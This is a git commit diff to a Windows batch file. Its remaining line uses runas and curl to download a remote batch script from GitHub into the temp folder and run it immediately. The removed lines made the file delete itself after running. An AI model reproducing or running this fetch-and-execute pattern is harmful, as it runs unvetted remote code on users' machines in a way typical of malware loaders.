16ae0af24813b6dd3ae98a8d53b390f479a86379
Voltex-XD <96913694+Voltex-XD@users.noreply.github.com>
2025-04-13 16:41:31 +0300

    Update script1.bat

--- script1.bat
+++ script1.bat
@@ -1,5 +1,2 @@
 @echo off
 runas /user:%USERNAME% "curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/script.bat -o \"%TEMP%\\script.bat\" && cmd /c call \"%TEMP%\\script.bat\""
-:: Delete self after execution
-del "%~f0"
-pause
